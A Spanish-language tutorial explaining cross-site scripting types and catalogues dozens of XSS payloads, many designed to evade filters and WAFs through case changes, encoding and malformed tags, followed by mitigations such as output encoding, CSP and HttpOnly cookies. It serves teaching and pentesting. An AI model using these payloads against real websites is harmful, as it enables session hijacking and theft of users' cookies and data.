# Cross-Site Scripting (XSS) Payloads Explained

## ¿Qué es XSS?

Cross-Site Scripting (XSS) es una vulnerabilidad web que permite inyectar código JavaScript malicioso en una aplicación vulnerable para que sea ejecutado en el navegador de otros usuarios.

El problema ocurre cuando una aplicación:

- recibe datos del usuario,
- no los valida o sanitiza correctamente,
- y luego los renderiza en el navegador.

---

# Tipos de XSS

## 1. Reflected XSS

El payload viaja en la petición y se refleja inmediatamente en la respuesta.

Ejemplo:

```html
https://site.com/search?q=<script>alert(1)</script>
```

---

## 2. Stored XSS

El payload se almacena en la base de datos y se ejecuta cuando otros usuarios cargan la página.

Ejemplos:
- comentarios,
- chats,
- perfiles,
- tickets.

---

## 3. DOM XSS

El JavaScript del frontend procesa datos inseguros directamente desde el DOM.

Ejemplo vulnerable:

```javascript
document.body.innerHTML = location.hash;
```

Payload:

```html
https://site.com/#<img src=x onerror=alert(1)>
```

---

# Payloads Explicados

---

# 1. HTML Event Handlers

Los navegadores permiten ejecutar JavaScript mediante eventos HTML.

---

## onfocus

```html
" onfocus="alert(1)"
```

### Explicación

- Se rompe el atributo HTML actual.
- Se agrega un nuevo evento `onfocus`.
- Cuando el elemento recibe foco, se ejecuta JavaScript.

### Ejemplo real

```html
<input value="" onfocus="alert(1)">
```

---

## onmouseover

```html
<a onmouseover="alert(document.cookie)">xss link</a>
```

### Explicación

El código se ejecuta cuando el mouse pasa sobre el elemento.

### Riesgo

Puede robar:
- cookies,
- tokens,
- sesiones.

---

## onload

```html
<BODY ONLOAD=alert('XSS')>
```

### Explicación

El JavaScript se ejecuta automáticamente al cargar la página.

---

## onerror

```html
<IMG SRC=x onerror=alert(1)>
```

### Explicación

- La imagen falla al cargar.
- Se dispara `onerror`.
- Se ejecuta el payload.

### Muy usado en pentesting

Porque funciona en muchos contextos.

---

# 2. Script Injection

---

## Payload básico

```html
<SCRIPT>alert("XSS")</SCRIPT>
```

### Explicación

La aplicación permite insertar etiquetas `<script>` directamente.

### Impacto

Permite ejecutar cualquier JavaScript.

---

## Script malformado

```html
<<SCRIPT>alert("XSS");//<</SCRIPT>
```

### Explicación

Intenta bypass:
- filtros,
- regex,
- WAFs.

Muchos filtros buscan únicamente:

```html
<script>
```

Este payload intenta romper esa detección.

---

# 3. javascript: Protocol

---

## Ejemplo clásico

```html
<IMG SRC="javascript:alert('XSS')">
```

### Explicación

Algunos atributos permiten protocolos especiales como:

- `http:`
- `https:`
- `javascript:`

El navegador interpreta el contenido como código JavaScript.

---

## Variaciones

```html
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

### Objetivo

Bypass de filtros case-sensitive.

---

## Con espacios y caracteres especiales

```html
<IMG SRC="jav	ascript:alert('XSS');">
```

```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```

### Explicación

Se insertan:
- tabs,
- saltos de línea,
- caracteres especiales.

Para evadir:
- WAF,
- filtros blacklist.

---

# 4. SVG Based XSS

---

## SVG onload

```html
<svg/onload=alert(1)>
```

### Explicación

SVG soporta eventos JavaScript.

Cuando el SVG carga:
- se dispara `onload`,
- se ejecuta el payload.

---

## Variante ofuscada

```html
<svg/onload=location=`javascript:alert(1)`>
```

### Objetivo

Evadir filtros usando:
- template literals,
- concatenaciones,
- encoding.

---

# 5. Browser Specific Payloads

Algunos payloads funcionan únicamente en ciertos navegadores.

---

## Firefox

```html
<svg><x><script>alert(1)</x>
```

### Explicación

Firefox interpreta incorrectamente ciertas estructuras SVG/XML.

---

## Internet Explorer / Edge Legacy

```html
<svg><script>alert(1)<p>
```

### Explicación

Aprovecha parsing legacy.

---

## VBScript (Internet Explorer)

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

### Explicación

Internet Explorer soportaba:
- `vbscript:`

Actualmente obsoleto.

---

# 6. Encoded Payloads

---

## HTML Entities

```html
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)>
```

### Explicación

Los caracteres están codificados en HTML entities.

Ejemplo:

```text
&#106; = j
```

Resultado final:

```text
javascript:
```

### Objetivo

Bypass de filtros simples.

---

## Hex Encoding

```html
<IMG SRC=&#x6A&#x61&#x76&#x61...>
```

### Explicación

Usa hexadecimal en lugar de decimal.

---

# 7. Attribute Injection

---

## Inyección en atributos

```html
" onfocus="alert(1)"
```

### Explicación

El atacante:
1. cierra el atributo actual,
2. agrega un nuevo atributo malicioso.

---

## Ejemplo vulnerable

```html
<input value="$USER_INPUT">
```

Payload:

```html
" onfocus="alert(1)
```

Resultado:

```html
<input value="" onfocus="alert(1)">
```

---

# 8. Breaking HTML Context

---

## Cierre de etiquetas

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

### Explicación

El payload:
1. cierra una etiqueta existente,
2. inyecta JavaScript nuevo.

---

# 9. DOM Based XSS

---

## Uso de URL Fragment

```text
#bounty
```

### Explicación

Muchos sitios procesan:

```javascript
location.hash
```

sin sanitizar.

---

## Payload

```html
https://site.com/#<svg/onload=alert(1)>
```

---

# 10. Legacy / Deprecated Payloads

Estos payloads son históricos y funcionan principalmente en navegadores antiguos.

---

## DYNSRC

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

---

## LOWSRC

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

---

## livescript

```html
<IMG SRC="livescript:[code]">
```

### Estado actual

Obsoletos en navegadores modernos.

---

# Payloads Más Comunes Actualmente

## Básicos

```html
<script>alert(1)</script>
```

```html
<img src=x onerror=alert(1)>
```

```html
<svg/onload=alert(1)>
```

---

# Impacto de XSS

Una vulnerabilidad XSS puede permitir:

- robo de cookies,
- robo de JWT,
- secuestro de sesión,
- keylogging,
- phishing,
- modificación del DOM,
- ejecución de acciones como el usuario,
- bypass parcial de MFA,
- exfiltración de datos.

---

# Relación con OWASP y CWE

## OWASP

- A03:2021 - Injection

---

## CWE

- CWE-79 → Improper Neutralization of Input During Web Page Generation
- CWE-80 → Improper Neutralization of Script-Related HTML Tags
- CWE-83 → Improper Neutralization of Script in Attributes

---

# Mitigaciones

## 1. Output Encoding

Escapar correctamente:
- HTML,
- atributos,
- JavaScript,
- URL.

---

## 2. Sanitización

Eliminar:
- `<script>`,
- eventos,
- `javascript:`.

---

## 3. CSP

Usar:

```http
Content-Security-Policy
```

Para restringir ejecución de scripts.

---

## 4. HttpOnly Cookies

Evita robo de cookies mediante JavaScript.

---

## 5. Evitar innerHTML

Malo:

```javascript
element.innerHTML = userInput;
```

Mejor:

```javascript
element.textContent = userInput;
```

---

# Recursos Recomendados

## OWASP XSS Cheat Sheet

- https://owasp.org/www-community/xss-filter-evasion-cheatsheet

---

## PortSwigger XSS Labs

- https://portswigger.net/web-security/cross-site-scripting

---

## PayloadAllTheThings

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

# Nota Final

Muchos payloads de esta lista:
- son históricos,
- funcionan solo en navegadores antiguos,
- o están diseñados para bypass específicos.

Sin embargo:
- siguen siendo útiles en pentesting,
- ayudan a entender parsing HTML,
- y permiten identificar filtros inseguros.